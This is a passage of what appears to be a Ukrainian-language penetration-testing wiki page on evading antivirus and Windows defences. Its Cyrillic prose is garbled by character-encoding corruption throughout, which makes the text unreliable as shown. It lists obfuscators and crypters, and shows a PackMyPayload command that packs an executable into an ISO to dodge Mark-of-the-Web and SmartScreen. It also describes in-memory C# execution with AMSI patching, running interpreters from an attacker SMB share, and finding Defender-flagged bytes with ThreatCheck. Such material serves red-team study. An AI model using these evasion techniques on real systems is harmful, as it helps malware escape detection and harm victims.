–Ü—Å–Ω—É—î –∫—ñ–ª—å–∫–∞ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **–æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó —á—ñ—Ç–∫–æ–≥–æ —Ç–µ–∫—Å—Ç—É C# –∫–æ–¥—É**, –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó **—à–∞–±–ª–æ–Ω—ñ–≤ –º–µ—Ç–∞–ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è** –¥–ª—è –∫–æ–º–ø—ñ–ª—è—Ü—ñ—ó –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –∞–±–æ **–æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏—Ö –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤**, —Ç–∞–∫–∏—Ö —è–∫:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# –æ–±—Ñ—É—Å–∫–∞—Ç–æ—Ä**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): –ú–µ—Ç–∞ —Ü—å–æ–≥–æ –ø—Ä–æ–µ–∫—Ç—É - –Ω–∞–¥–∞—Ç–∏ –≤—ñ–¥–∫—Ä–∏—Ç—É –≤–µ—Ä—Å—ñ—é [LLVM](http://www.llvm.org/) –∫–æ–º–ø—ñ–ª—è—Ü—ñ–π–Ω–æ–≥–æ –Ω–∞–±–æ—Ä—É, —è–∫–∞ –∑–¥–∞—Ç–Ω–∞ –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏ –ø—ñ–¥–≤–∏—â–µ–Ω—É –±–µ–∑–ø–µ–∫—É –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [–æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó –∫–æ–¥—É](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) —Ç–∞ –∑–∞—Ö–∏—Å—Ç—É –≤—ñ–¥ –≤—Ç—Ä—É—á–∞–Ω–Ω—è.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator –ø–æ–∫–∞–∑—É—î, —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –º–æ–≤—É `C++11/14` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó, –Ω–∞ –µ—Ç–∞–ø—ñ –∫–æ–º–ø—ñ–ª—è—Ü—ñ—ó, –æ–±—Ñ—É—Å–∫–æ–≤–∞–Ω–æ–≥–æ –∫–æ–¥—É –±–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ —Ç–∞ –±–µ–∑ –∑–º—ñ–Ω–∏ –∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä–∞.
* [**obfy**](https://github.com/fritzone/obfy): –î–æ–¥–∞—î —à–∞—Ä –æ–±—Ñ—É—Å–∫–æ–≤–∞–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π, –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏—Ö —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–æ–º –º–µ—Ç–∞–ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è C++, —â–æ —É—Å–∫–ª–∞–¥–Ω–∏—Ç—å –∂–∏—Ç—Ç—è –æ—Å–æ–±—ñ, —è–∫–∞ —Ö–æ—á–µ –≤–∑–ª–∞–º–∞—Ç–∏ –¥–æ–¥–∞—Ç–æ–∫.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz - —Ü–µ x64 –±—ñ–Ω–∞—Ä–Ω–∏–π –æ–±—Ñ—É—Å–∫–∞—Ç–æ—Ä, —è–∫–∏–π –º–æ–∂–µ –æ–±—Ñ—É—Å–∫—É–≤–∞—Ç–∏ —Ä—ñ–∑–Ω—ñ —Ñ–∞–π–ª–∏ pe, –≤–∫–ª—é—á–∞—é—á–∏: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame - —Ü–µ –ø—Ä–æ—Å—Ç–∏–π –¥–≤–∏–≥—É–Ω –º–µ—Ç–∞–º–æ—Ä—Ñ–Ω–æ–≥–æ –∫–æ–¥—É –¥–ª—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –≤–∏–∫–æ–Ω–∞–≤—á–∏—Ö —Ñ–∞–π–ª—ñ–≤.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator - —Ü–µ —Ñ—Ä–µ–π–º–≤–æ—Ä–∫ –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó –∫–æ–¥—É –∑ –¥—Ä—ñ–±–Ω–∏–º–∏ –¥–µ—Ç–∞–ª—è–º–∏ –¥–ª—è –º–æ–≤, —è–∫—ñ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å—Å—è LLVM, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ ROP (–ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è). ROPfuscator –æ–±—Ñ—É—Å–∫—É—î –ø—Ä–æ–≥—Ä–∞–º—É –Ω–∞ —Ä—ñ–≤–Ω—ñ –∫–æ–¥—É –∞—Å–µ–º–±–ª–µ—Ä–∞, –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—é—á–∏ –∑–≤–∏—á–∞–π–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó –≤ –ª–∞–Ω—Ü—é–≥–∏ ROP, –ø–µ—Ä–µ—à–∫–æ–¥–∂–∞—é—á–∏ –Ω–∞—à–æ–º—É –ø—Ä–∏—Ä–æ–¥–Ω–æ–º—É —É—è–≤–ª–µ–Ω–Ω—é –ø—Ä–æ –Ω–æ—Ä–º–∞–ª—å–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–∏–π –ø–æ—Ç—ñ–∫.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt - —Ü–µ .NET PE Crypter, –Ω–∞–ø–∏—Å–∞–Ω–∏–π –Ω–∞ Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor –º–æ–∂–µ –ø–µ—Ä–µ—Ç–≤–æ—Ä–∏—Ç–∏ —ñ—Å–Ω—É—é—á–∏–π EXE/DLL –≤ shellcode, –∞ –ø–æ—Ç—ñ–º –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —ó—Ö

## SmartScreen & MoTW

–ú–æ–∂–ª–∏–≤–æ, –≤–∏ –±–∞—á–∏–ª–∏ —Ü–µ–π –µ–∫—Ä–∞–Ω –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ –¥–µ—è–∫–∏—Ö –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –∑ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É —Ç–∞ —ó—Ö –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ.

Microsoft Defender SmartScreen - —Ü–µ –º–µ—Ö–∞–Ω—ñ–∑–º –±–µ–∑–ø–µ–∫–∏, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É –∫—ñ–Ω—Ü–µ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤—ñ–¥ –∑–∞–ø—É—Å–∫—É –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ —à–∫—ñ–¥–ª–∏–≤–∏—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –ø—Ä–∞—Ü—é—î –∑–∞ –ø—ñ–¥—Ö–æ–¥–æ–º –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ä–µ–ø—É—Ç–∞—Ü—ñ—ó, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –Ω–µ–∑–≤–∏—á–∞–π–Ω—ñ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ —Å–ø—Ä–∏—á–∏–Ω—è—Ç—å —Å–ø—Ä–∞—Ü—é–≤–∞–Ω–Ω—è SmartScreen, —â–æ —Å–ø–æ–≤—ñ—Å—Ç–∏—Ç—å —Ç–∞ –∑–∞–ø–æ–±—ñ–∂–∏—Ç—å –∫—ñ–Ω—Ü–µ–≤–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ñ–∞–π–ª (—Ö–æ—á–∞ —Ñ–∞–π–ª –≤—Å–µ –æ–¥–Ω–æ –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏, –Ω–∞—Ç–∏—Å–Ω—É–≤—à–∏ –î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è -> –í—Å–µ –æ–¥–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏).

**MoTW** (Mark of The Web) - —Ü–µ [–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–π –ø–æ—Ç—ñ–∫ –¥–∞–Ω–∏—Ö NTFS](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) –∑ –Ω–∞–∑–≤–æ—é Zone.Identifier, —è–∫–∏–π –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ —Ñ–∞–π–ª—ñ–≤ –∑ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É, —Ä–∞–∑–æ–º –∑ URL, –∑ —è–∫–æ–≥–æ –≤–æ–Ω–∏ –±—É–ª–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ–≥–æ –ø–æ—Ç–æ–∫—É –¥–∞–Ω–∏—Ö Zone.Identifier –¥–ª—è —Ñ–∞–π–ª—É, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ–≥–æ –∑ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É.</p></figcaption></figure>

{% hint style="info" %}
–í–∞–∂–ª–∏–≤–æ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ –≤–∏–∫–æ–Ω—É–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏, –ø—ñ–¥–ø–∏—Å–∞–Ω—ñ **–¥–æ–≤—ñ—Ä–µ–Ω–∏–º** —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º **–Ω–µ —Å–ø—Ä–∏—á–∏–Ω—è—Ç—å —Å–ø—Ä–∞—Ü—é–≤–∞–Ω–Ω—è SmartScreen**.
{% endhint %}

–î—É–∂–µ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–º —Å–ø–æ—Å–æ–±–æ–º –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –æ—Ç—Ä–∏–º–∞–Ω–Ω—é –≤–∞—à–∏—Ö –≤–∞–Ω—Ç–∞–∂–µ–Ω—å –≤—ñ–¥ Mark of The Web —î —É–ø–∞–∫—É–≤–∞–Ω–Ω—è —ó—Ö —É —è–∫–∏–π-–Ω–µ–±—É–¥—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, ISO. –¶–µ —Ç—Ä–∞–ø–ª—è—î—Ç—å—Å—è —Ç–æ–º—É, —â–æ Mark-of-the-Web (MOTW) **–Ω–µ –º–æ–∂–µ** –±—É—Ç–∏ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–∏–π –¥–æ **–Ω–µ—Å–∏—Å—Ç–µ–º–Ω–∏—Ö NTFS** —Ç–æ–º—ñ–≤.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π —É–ø–∞–∫–æ–≤—É—î –≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤ –≤–∏—Ö—ñ–¥–Ω—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏ –¥–ª—è —É—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ Mark-of-the-Web.

–ü—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
## –í—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∑–±–æ—Ä–∫–∏ C#

–ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ C# –≤ –ø–∞–º'—è—Ç—å –≤—ñ–¥–æ–º–æ –≤–∂–µ –¥–∞–≤–Ω–æ —ñ –≤—Å–µ —â–µ —î –¥—É–∂–µ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–º —Å–ø–æ—Å–æ–±–æ–º –∑–∞–ø—É—Å–∫—É –≤–∞—à–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –ø—ñ—Å–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –±–µ–∑ —Ä–∏–∑–∏–∫—É –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –ø—ñ–¥ –ø—Ä–∏—Ü—ñ–ª –ê–Ω—Ç–∏–≤—ñ—Ä—É—Å—É.

–û—Å–∫—ñ–ª—å–∫–∏ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ –ø–∞–º'—è—Ç—å, –Ω–µ —Ç–æ—Ä–∫–∞—é—á–∏—Å—å –¥–∏—Å–∫–∞, –Ω–∞–º –¥–æ–≤–µ–¥–µ—Ç—å—Å—è —Ç—É—Ä–±—É–≤–∞—Ç–∏—Å—è –ª–∏—à–µ –ø—Ä–æ –ø–∞—Ç—á—ñ–Ω–≥ AMSI –¥–ª—è –≤—Å—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É.

–ë—ñ–ª—å—à—ñ—Å—Ç—å —Ñ—Ä–µ–π–º–≤–æ—Ä–∫—ñ–≤ C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc —Ç–æ—â–æ) –≤–∂–µ –Ω–∞–¥–∞—é—Ç—å –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ C# –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ –ø–∞–º'—è—Ç—å, –∞–ª–µ —î —Ä—ñ–∑–Ω—ñ —Å–ø–æ—Å–æ–±–∏ —Ü—å–æ–≥–æ:

* **Fork\&Run**

–¶–µ –≤–∫–ª—é—á–∞—î **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∂–µ—Ä—Ç–æ–≤–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É**, –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –≤–∞—à–æ–≥–æ –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ –∫–æ–¥—É –ø—ñ—Å–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤ —Ü–µ–π –Ω–æ–≤–∏–π –ø—Ä–æ—Ü–µ—Å, –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ –∫–æ–¥—É —ñ –ø—ñ—Å–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è - –≤–±–∏–≤—Å—Ç–≤–æ –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É. –¶–µ–π –º–µ—Ç–æ–¥ –º–∞—î —è–∫ —Å–≤–æ—ó –ø–µ—Ä–µ–≤–∞–≥–∏, —Ç–∞–∫ —ñ –Ω–µ–¥–æ–ª—ñ–∫–∏. –ü–µ—Ä–µ–≤–∞–≥–∞ –º–µ—Ç–æ–¥—É fork and run –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è **–ø–æ–∑–∞** –ø—Ä–æ—Ü–µ—Å–æ–º –Ω–∞—à–æ—ó —ñ–º–ø–ª–∞–Ω—Ç–∞—Ü—ñ—ó Beacon. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ —è–∫—â–æ —â–æ—Å—å –ø—ñ–¥–µ –Ω–µ —Ç–∞–∫ –∞–±–æ –±—É–¥–µ –≤–∏—è–≤–ª–µ–Ω–æ –ø—ñ–¥ —á–∞—Å –Ω–∞—à–æ—ó –¥—ñ—ó –ø—ñ—Å–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó, —î **–Ω–∞–±–∞–≥–∞—Ç–æ –±—ñ–ª—å—à–µ —à–∞–Ω—Å—ñ–≤ –Ω–∞—à–æ—ó —ñ–º–ø–ª–∞–Ω—Ç–∞—Ü—ñ—ó –≤–∏–∂–∏—Ç–∏.** –ù–µ–¥–æ–ª—ñ–∫ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ —É –≤–∞—Å —î **–±—ñ–ª—å—à–µ —à–∞–Ω—Å—ñ–≤** –±—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–∏–º **–ø–æ–≤–µ–¥—ñ–Ω–∫–æ–≤–∏–º–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è–º–∏**.

* **Inline**

–¶–µ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –≤–ø—Ä–æ–≤–∞–¥–∂—É—î—Ç—å—Å—è –∑–ª–æ–≤–º–∏—Å–Ω–∏–π –∫–æ–¥ –ø—ñ—Å–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó **–≤ —Å–≤—ñ–π –≤–ª–∞—Å–Ω–∏–π –ø—Ä–æ—Ü–µ—Å**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤–∏ –º–æ–∂–µ—Ç–µ —É–Ω–∏–∫–Ω—É—Ç–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É —Ç–∞ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –π–æ–≥–æ –ê–Ω—Ç–∏–≤—ñ—Ä—É—Å–æ–º, –∞–ª–µ –Ω–µ–¥–æ–ª—ñ–∫ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ —è–∫—â–æ —â–æ—Å—å –ø—ñ–¥–µ –Ω–µ —Ç–∞–∫ –∑ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è–º –≤–∞—à–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —î **–Ω–∞–±–∞–≥–∞—Ç–æ –±—ñ–ª—å—à–µ —à–∞–Ω—Å—ñ–≤** **–≤—Ç—Ä–∞—Ç–∏—Ç–∏ –≤–∞—à—É –º–∞—è—á–Ω—É –≤–æ–≥–æ–Ω—å** —á–µ—Ä–µ–∑ –º–æ–∂–ª–∏–≤—É –∞–≤–∞—Ä—ñ—é.

## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —ñ–Ω—à–∏—Ö –º–æ–≤ –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è

–Ø–∫ –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–æ –≤ [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–π –∫–æ–¥, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ–Ω—à—ñ –º–æ–≤–∏ –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è, –Ω–∞–¥–∞–≤—à–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω—ñ–π –º–∞—à–∏–Ω—ñ –¥–æ—Å—Ç—É–ø **–¥–æ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–∞, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ–≥–æ –Ω–∞ SMB-—Ä–µ—Å—É—Ä—Å—ñ, –∫–µ—Ä–æ–≤–∞–Ω–æ–º—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º**.

–î–æ–∑–≤–æ–ª—è—é—á–∏ –¥–æ—Å—Ç—É–ø –¥–æ –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–∞ —Ç–∞ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –Ω–∞ SMB-—Ä–µ—Å—É—Ä—Å—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥ –Ω–∞ —Ü–∏—Ö –º–æ–≤–∞—Ö –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è –≤ –ø–∞–º'—è—Ç—ñ** –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ—ó –º–∞—à–∏–Ω–∏.

–£ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó –∑–∞–∑–Ω–∞—á–µ–Ω–æ: Defender –≤—Å–µ —â–µ —Å–∫–∞–Ω—É—î —Å–∫—Ä–∏–ø—Ç–∏, –∞–ª–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Go, Java, PHP —Ç–æ—â–æ, –º–∏ –º–∞—î–º–æ **–±—ñ–ª—å—à—É –≥–Ω—É—á–∫—ñ—Å—Ç—å –¥–ª—è –æ–±—Ö—ñ–¥—É —Å—Ç–∞—Ç–∏—á–Ω–∏—Ö –ø—ñ–¥–ø–∏—Å—ñ–≤**. –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è –∑ –≤–∏–ø–∞–¥–∫–æ–≤–∏–º–∏ –Ω–µ–æ–±—Ñ—É—Å–∫–æ–≤–∞–Ω–∏–º–∏ —Å–∫—Ä–∏–ø—Ç–∞–º–∏ –æ–±–µ—Ä—Ç–∞–Ω–Ω—è –æ–±–µ—Ä—Ç–∞–Ω–Ω—è –Ω–∞ —Ü–∏—Ö –º–æ–≤–∞—Ö –±—É–ª–æ —É—Å–ø—ñ—à–Ω–∏–º.

## –†–æ–∑—à–∏—Ä–µ–Ω–µ —É—Ö–∏–ª–µ–Ω–Ω—è

–£—Ö–∏–ª–µ–Ω–Ω—è - —Ü–µ –¥—É–∂–µ —Å–∫–ª–∞–¥–Ω–∞ —Ç–µ–º–∞, —ñ–Ω–æ–¥—ñ –≤–∞–º –¥–æ–≤–æ–¥–∏—Ç—å—Å—è –≤—Ä–∞—Ö–æ–≤—É–≤–∞—Ç–∏ –±–∞–≥–∞—Ç–æ —Ä—ñ–∑–Ω–∏—Ö –¥–∂–µ—Ä–µ–ª —Ç–µ–ª–µ–º–µ—Ç—Ä—ñ—ó –≤ –æ–¥–Ω—ñ–π —Å–∏—Å—Ç–µ–º—ñ, —Ç–æ–º—É –ø—Ä–∞–∫—Ç–∏—á–Ω–æ –Ω–µ–º–æ–∂–ª–∏–≤–æ –∑–∞–ª–∏—à–∏—Ç–∏—Å—è –ø–æ–≤–Ω—ñ—Å—Ç—é –Ω–µ–≤–∏—è–≤–ª–µ–Ω–∏–º –≤ –∑—Ä—ñ–ª–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö.

–£ –∫–æ–∂–Ω–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ, –∑ —è–∫–∏–º –≤–∏ —Å—Ç–∏–∫–∞—î—Ç–µ—Å—è, —î —Å–≤–æ—ó –ø–µ—Ä–µ–≤–∞–≥–∏ —Ç–∞ –Ω–µ–¥–æ–ª—ñ–∫–∏.

–Ø –Ω–∞—Å—Ç—ñ–π–Ω–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é –≤–∞–º –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ —Ü–µ–π –≤–∏—Å—Ç—É–ø –≤—ñ–¥ [@ATTL4S](https://twitter.com/DaniLJ94), —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤—ñ–¥—á—É—Ç—Ç—è –±—ñ–ª—å—à —Ä–æ–∑—à–∏—Ä–µ–Ω–∏—Ö —Ç–µ—Ö–Ω—ñ–∫ —É—Ö–∏–ª–µ–Ω–Ω—è.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

–¢–∞–∫–æ–∂ —î —â–µ –æ–¥–∏–Ω —á—É–¥–æ–≤–∏–π –≤–∏—Å—Ç—É–ø –≤—ñ–¥ [@mariuszbit](https://twitter.com/mariuszbit) –ø—Ä–æ —É—Ö–∏–ª–µ–Ω–Ω—è –≤ –≥–ª–∏–±–∏–Ω—É.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **–°—Ç–∞—Ä—ñ —Ç–µ—Ö–Ω—ñ–∫–∏**

### **–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫—ñ —á–∞—Å—Ç–∏–Ω–∏ Defender –≤–≤–∞–∂–∞—î –∑–ª–æ–≤—ñ—Å–Ω–∏–º–∏**

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), —è–∫–∏–π –±—É–¥–µ **–≤–∏–¥–∞–ª—è—Ç–∏ —á–∞—Å—Ç–∏–Ω–∏ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É**, –ø–æ–∫–∏ –Ω–µ **–≤–∏—è–≤–∏—Ç—å, —è–∫–∞ —á–∞—Å—Ç–∏–Ω–∞ Defender** –≤–≤–∞–∂–∞—î –∑–ª–æ–≤—ñ—Å–Ω–æ—é —ñ —Ä–æ–∑–¥—ñ–ª–∏—Ç—å —ó—ó –¥–ª—è –≤–∞—Å.\
